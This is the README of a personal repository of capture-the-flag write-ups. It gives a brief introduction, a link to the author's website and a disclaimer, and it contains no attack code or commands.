# CTF writeups

This repository contains write ups for CTFs that I attended.

Check out my other work on my <a href="https://shreethaar.github.io/">website</a>.

## Disclaimer

The solutions that are written in these write ups are just **one** way of solving the challenges, and are by no means the most efficient route.
 
Furthermore, any ideas discussed here are mine and do not necessarily reflect the views of my employer or coworkers.
